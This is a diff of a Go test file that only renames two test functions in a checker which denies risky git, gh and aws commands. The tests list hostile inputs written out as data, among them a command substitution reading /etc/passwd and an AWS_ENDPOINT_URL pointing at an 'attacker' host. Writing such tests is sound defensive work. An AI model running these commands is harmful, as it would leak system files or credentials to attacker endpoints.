@@ -13,7 +13,7 @@ import "testing"
 
 // Non-static argv (command substitution, unresolved variable, glob) on a
 // git/gh/aws command must DENY — the dynamic token can hide a dangerous op.
-func TestPrecondition_NonStaticArgv_64(t *testing.T) {
+func TestPrecondition_NonStaticArgv(t *testing.T) {
 	for _, cmd := range []string{
 		"git log $(cat /etc/passwd)",
 		"git $OP",
@@ -31,7 +31,7 @@ func TestPrecondition_NonStaticArgv_64(t *testing.T) {
 // Inline env-assignment before git/gh/aws DENYs (egress/identity/pager redirect
 // without touching argv). Covers both the bare `VAR=x cmd` and `env VAR=x cmd`
 // forms, for all three tools.
-func TestPrecondition_InlineEnvAssignment_64(t *testing.T) {
+func TestPrecondition_InlineEnvAssignment(t *testing.T) {
 	for _, cmd := range []string{
 		"AWS_ENDPOINT_URL=http://attacker aws s3api list-buckets",
 		"GIT_SSH_COMMAND=evil git fetch",
